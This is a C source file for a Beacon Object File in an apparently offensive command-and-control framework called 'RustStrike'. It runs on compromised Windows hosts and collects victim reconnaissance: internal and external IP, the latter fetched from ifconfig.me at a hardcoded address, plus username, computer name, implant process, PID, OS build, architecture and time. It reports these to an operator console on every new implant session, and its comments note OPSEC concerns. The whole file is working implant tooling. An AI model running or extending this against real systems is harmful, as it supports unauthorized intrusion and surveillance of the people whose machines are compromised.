/*
 * sysinfo BOF for RustStrike — collect host recon for the agent table.
 *
 *   args: none
 *
 * Collects exactly the fields the frontend BeaconTable shows, so the operator
 * console populates Internal/External IP, User, Computer, Process, PID,
 * OS/Arch, Online Time the moment an implant connects. The Go core auto-runs
 * this BOF on every new session (sysinfo collector), parses the KEY=VALUE
 * lines, stores them on the agent, and refetches the implant list.
 *
 * Output (one KEY=VALUE per line, \n-terminated):
 *   internal_ip=10.0.0.5
 *   external_ip=1.2.3.4          (HTTP GET http://ifconfig.me/ip)
 *   user=alice
 *   computer=DESKTOP-ABC
 *   process=ruststrike-implant.exe
 *   pid=1234
 *   os=Windows 11
 *   os_build=22631
 *   arch=x86_64
 *   online_time=2026-06-28 10:15:00
 *
 * The external-IP lookup makes an outbound network call to a third party
 * (ifconfig.me) — an OPSEC consideration; the core only runs this on connect.
 *
 * Build (mingw):
 *   gcc -c examples/sysinfo.c -o examples/sysinfo.x64.o
 */
#include <windows.h>
#include "beacon.h"

/* ---- BOF Imports ---- */
DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$GetUserNameA(LPSTR, LPDWORD);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$GetComputerNameA(LPSTR, LPDWORD);
DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$GetCurrentProcessId(void);
DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$GetModuleFileNameA(HMODULE, LPSTR, DWORD);
DECLSPEC_IMPORT void   WINAPI KERNEL32$GetSystemInfo(LPSYSTEM_INFO);
DECLSPEC_IMPORT void   WINAPI KERNEL32$GetLocalTime(LPSYSTEMTIME);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$GetProcessHeap(void);
DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$HeapAlloc(HANDLE, DWORD, SIZE_T);
DECLSPEC_IMPORT WINBOOL WINAPI KERNEL32$HeapFree(HANDLE, DWORD, LPVOID);
DECLSPEC_IMPORT int    WINAPI NTDLL$RtlGetVersion(void *); /* RTL_OSVERSIONINFOEXW* */

/* WinSock2 via ws2_32 (internal IP via UDP-connect trick, external via HTTP) */
DECLSPEC_IMPORT int  WINAPI WS2_32$WSAStartup(WORD, void*);
DECLSPEC_IMPORT void WINAPI WS2_32$WSACleanup(void);
DECLSPEC_IMPORT unsigned int WINAPI WS2_32$socket(int, int, int);
DECLSPEC_IMPORT int  WINAPI WS2_32$connect(unsigned int, const void*, int);
DECLSPEC_IMPORT int  WINAPI WS2_32$send(unsigned int, const char*, int, int);
DECLSPEC_IMPORT int  WINAPI WS2_32$recv(unsigned int, char*, int, int);
DECLSPEC_IMPORT int  WINAPI WS2_32$closesocket(unsigned int);
DECLSPEC_IMPORT int  WINAPI WS2_32$getsockname(unsigned int, void*, int*);

#define AF_INET_    2
#define SOCK_STREAM_ 1
#define SOCK_DGRAM_  2

/* RTL_OSVERSIONINFOEXW layout (dwOSVersionInfoSize must be set to 284). */
typedef struct {
    DWORD dwOSVersionInfoSize;
    DWORD dwMajorVersion;
    DWORD dwMinorVersion;
    DWORD dwBuildNumber;
    DWORD dwPlatformId;
    wchar_t szCSDVersion[128];
    WORD  wServicePackMajor;
    WORD  wServicePackMinor;
    WORD  wSuiteMask;
    BYTE  wProductType;
    BYTE  wReserved;
} OSVERSIONINFOEXW_;

static void bof_memset(void* dst, int val, unsigned long long n) {
    unsigned char* p = (unsigned char*)dst;
    while (n--) *p++ = (unsigned char)val;
}
static void bof_memcpy(void* dst, const void* src, unsigned long long n) {
    unsigned char* d = (unsigned char*)dst;
    const unsigned char* s = (const unsigned char*)src;
    while (n--) *d++ = *s++;
}
static int bof_strlen(const char* s) { int n = 0; while (s[n]) n++; return n; }
static void bof_strcat(char* dst, const char* src) {
    int i = bof_strlen(dst); int j = 0;
    while (src[j]) dst[i++] = src[j++];
    dst[i] = '\0';
}
static void int_to_str(char* buf, unsigned int v) {
    char tmp[16]; int i = 0;
    if (v == 0) { buf[0] = '0'; buf[1] = '\0'; return; }
    while (v > 0) { tmp[i++] = '0' + (v % 10); v /= 10; }
    int j = 0; while (i > 0) buf[j++] = tmp[--i];
    buf[j] = '\0';
}
static void ip_to_str(char* buf, unsigned char* ip) {
    char tmp[8]; buf[0] = '\0';
    for (int i = 0; i < 4; i++) {
        int_to_str(tmp, ip[i]);
        bof_strcat(buf, tmp);
        if (i < 3) bof_strcat(buf, ".");
    }
}

/* Append "key=value\n" to the output buffer. */
static void append_kv(char* out, const char* key, const char* val) {
    bof_strcat(out, key);
    bof_strcat(out, "=");
    bof_strcat(out, val);
    bof_strcat(out, "\n");
}

static void format_time(char* buf, SYSTEMTIME* st) {
    char tmp[8];
    int_to_str(tmp, st->wYear); bof_strcat(buf, tmp); bof_strcat(buf, "-");
    if (st->wMonth < 10) bof_strcat(buf, "0"); int_to_str(tmp, st->wMonth); bof_strcat(buf, tmp); bof_strcat(buf, "-");
    if (st->wDay < 10) bof_strcat(buf, "0"); int_to_str(tmp, st->wDay); bof_strcat(buf, tmp); bof_strcat(buf, " ");
    if (st->wHour < 10) bof_strcat(buf, "0"); int_to_str(tmp, st->wHour); bof_strcat(buf, tmp); bof_strcat(buf, ":");
    if (st->wMinute < 10) bof_strcat(buf, "0"); int_to_str(tmp, st->wMinute); bof_strcat(buf, tmp); bof_strcat(buf, ":");
    if (st->wSecond < 10) bof_strcat(buf, "0"); int_to_str(tmp, st->wSecond); bof_strcat(buf, tmp);
}

/* Internal IP via UDP connect trick (doesn't actually send packets). */
static void get_internal_ip(char* out, int outsz) {
    unsigned char sa[16], local_sa[16]; int sa_len;
    bof_memset(out, 0, outsz); bof_memset(sa, 0, sizeof(sa));
    sa[0] = AF_INET_; sa[2] = 0; sa[3] = 53; sa[4] = 8; sa[5] = 8; sa[6] = 8; sa[7] = 8;
    unsigned int s = WS2_32$socket(AF_INET_, SOCK_DGRAM_, 17);
    if (s == (unsigned int)-1) { bof_memcpy(out, "127.0.0.1", 10); return; }
    if (WS2_32$connect(s, sa, 16) != 0) { WS2_32$closesocket(s); bof_memcpy(out, "127.0.0.1", 10); return; }
    bof_memset(local_sa, 0, sizeof(local_sa)); sa_len = 16;
    WS2_32$getsockname(s, local_sa, &sa_len);
    WS2_32$closesocket(s);
    ip_to_str(out, &local_sa[4]);
}

/* External IP via HTTP/1.0 GET to ifconfig.me/ip (hardcoded IP to avoid DNS). */
static void get_external_ip(char* out, int outsz) {
    unsigned char sa[16]; unsigned int s; int n;
    char req[] = "GET /ip HTTP/1.0\r\nHost: ifconfig.me\r\nUser-Agent: curl/8.0\r\nAccept: */*\r\n\r\n";
    char resp[512];
    bof_memset(out, 0, outsz);
    bof_memset(sa, 0, sizeof(sa));
    sa[0] = AF_INET_; sa[2] = 0; sa[3] = 80; sa[4] = 34; sa[5] = 160; sa[6] = 111; sa[7] = 145;
    s = WS2_32$socket(AF_INET_, SOCK_STREAM_, 6);
    if (s == (unsigned int)-1) return;
    if (WS2_32$connect(s, sa, 16) != 0) { WS2_32$closesocket(s); return; }
    WS2_32$send(s, req, bof_strlen(req), 0);
    bof_memset(resp, 0, sizeof(resp));
    n = WS2_32$recv(s, resp, sizeof(resp) - 1, 0);
    WS2_32$closesocket(s);
    if (n <= 0) return;
    resp[n] = '\0';
    char* body = NULL;
    for (int i = 0; i < n - 3; i++) {
        if (resp[i] == '\r' && resp[i+1] == '\n' && resp[i+2] == '\r' && resp[i+3] == '\n') {
            body = &resp[i + 4]; break;
        }
    }
    if (!body) return;
    while (*body == ' ' || *body == '\r' || *body == '\n' || *body == '\t') body++;
    int len = bof_strlen(body);
    while (len > 0 && (body[len-1] == ' ' || body[len-1] == '\r' || body[len-1] == '\n')) len--;
    if (len > 0 && len < outsz) { bof_memcpy(out, body, len); out[len] = '\0'; }
}

/* Map major.minor + build to a Windows product name. */
static void os_name(char* out, int outsz, DWORD major, DWORD minor, DWORD build) {
    out[0] = 0;
    if (major == 10 && minor == 0) {
        if (build >= 22000) bof_memcpy(out, "Windows 11", 11);
        else bof_memcpy(out, "Windows 10", 11);
    } else if (major == 6 && minor == 3) bof_memcpy(out, "Windows 8.1", 12);
    else if (major == 6 && minor == 2) bof_memcpy(out, "Windows 8", 10);
    else if (major == 6 && minor == 1) bof_memcpy(out, "Windows 7", 10);
    else if (major == 6 && minor == 0) bof_memcpy(out, "Windows Vista", 14);
    else if (major == 5 && minor == 1) bof_memcpy(out, "Windows XP", 11);
    else {
        char a[16], b[16];
        int_to_str(a, major); int_to_str(b, minor);
        bof_strcat(out, "Windows "); bof_strcat(out, a); bof_strcat(out, "."); bof_strcat(out, b);
    }
    (void)outsz;
}

void go(char* args, int alen)
{
    (void)args; (void)alen;

    char tmp[256], numBuf[16];
    DWORD len;
    SYSTEM_INFO si;
    SYSTEMTIME st;
    OSVERSIONINFOEXW_ osvi;

    unsigned char wsaData[512];
    WS2_32$WSAStartup(0x0202, wsaData);

    HANDLE heap = KERNEL32$GetProcessHeap();
    char *out = (char *) KERNEL32$HeapAlloc(heap, 0, 4096);
    if (!out) { BeaconPrintf(CALLBACK_ERROR, "sysinfo: out of memory"); return; }
    out[0] = 0;

    /* internal_ip */
    bof_memset(tmp, 0, sizeof(tmp)); get_internal_ip(tmp, sizeof(tmp));
    append_kv(out, "internal_ip", tmp);

    /* external_ip */
    bof_memset(tmp, 0, sizeof(tmp)); get_external_ip(tmp, sizeof(tmp));
    append_kv(out, "external_ip", tmp[0] ? tmp : "(unreachable)");

    /* user */
    bof_memset(tmp, 0, sizeof(tmp)); len = sizeof(tmp);
    if (ADVAPI32$GetUserNameA(tmp, &len)) append_kv(out, "user", tmp);
    else append_kv(out, "user", "unknown");

    /* computer */
    bof_memset(tmp, 0, sizeof(tmp)); len = sizeof(tmp);
    if (KERNEL32$GetComputerNameA(tmp, &len)) append_kv(out, "computer", tmp);
    else append_kv(out, "computer", "unknown");

    /* process (basename of the implant exe) */
    bof_memset(tmp, 0, sizeof(tmp));
    {
        DWORD pathLen = KERNEL32$GetModuleFileNameA(NULL, tmp, sizeof(tmp));
        char* fname = tmp;
        for (DWORD i = 0; i < pathLen; i++) if (tmp[i] == '\\' || tmp[i] == '/') fname = &tmp[i + 1];
        append_kv(out, "process", fname);
    }

    /* pid */
    int_to_str(numBuf, KERNEL32$GetCurrentProcessId());
    append_kv(out, "pid", numBuf);

    /* os + os_build (RtlGetVersion — not subject to the Win32 manifest lie) */
    bof_memset(&osvi, 0, sizeof(osvi));
    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEXW_);
    if (NTDLL$RtlGetVersion(&osvi) == 0) {
        os_name(tmp, sizeof(tmp), osvi.dwMajorVersion, osvi.dwMinorVersion, osvi.dwBuildNumber);
        append_kv(out, "os", tmp);
        int_to_str(numBuf, osvi.dwBuildNumber);
        append_kv(out, "os_build", numBuf);
    } else {
        append_kv(out, "os", "Windows");
        append_kv(out, "os_build", "0");
    }

    /* arch */
    bof_memset(&si, 0, sizeof(si));
    KERNEL32$GetSystemInfo(&si);
    char arch[32]; arch[0] = 0;
    switch (si.wProcessorArchitecture) {
        case 9:  bof_memcpy(arch, "x86_64", 7); break;
        case 12: bof_memcpy(arch, "ARM64", 6); break;
        case 0:  bof_memcpy(arch, "x86", 4); break;
        default: int_to_str(arch, si.wProcessorArchitecture); break;
    }
    append_kv(out, "arch", arch);

    /* online_time (local time, formatted) */
    bof_memset(&st, 0, sizeof(st));
    KERNEL32$GetLocalTime(&st);
    bof_memset(tmp, 0, sizeof(tmp));
    format_time(tmp, &st);
    append_kv(out, "online_time", tmp);

    WS2_32$WSACleanup();

    BeaconOutput(CALLBACK_OUTPUT, out, bof_strlen(out));
    KERNEL32$HeapFree(heap, 0, out);
}
